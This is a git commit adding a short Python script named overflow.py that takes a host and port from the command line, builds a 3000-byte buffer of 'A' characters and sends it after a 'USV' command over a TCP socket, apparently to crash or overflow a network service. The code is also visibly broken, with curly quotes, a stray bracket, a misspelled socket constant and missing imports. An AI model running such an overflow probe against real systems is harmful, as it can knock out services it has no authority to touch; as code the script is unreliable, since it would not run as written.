d5184a39f97c4f8ee3693602d93a1c7c601f3836
balatzgs <jbcreativeartists@gmail.com>
2017-06-06 09:16:37 +0200

    master push

---
+++ overflow.py
@@ -0,0 +1,27 @@
+for carg in sys.argv:
+
+            if carg == “-s”:
+
+                        argnum = sys.argv.index(carg)
+
+                        argnum += 1
+
+                        host = sys.argv[argnum]
+
+            elif carg == “-p”:
+
+                        argnum = sys.argv.index(carg)
+
+                        argnum += 1
+
+                        port = sys.argv[argnum[
+
+buffer = “\x41″* 3000
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STRAEM)
+
+s.connect((host,port))
+
+s.send(“USV ” + buffer + “//r//n//r”)
+
+s.close()
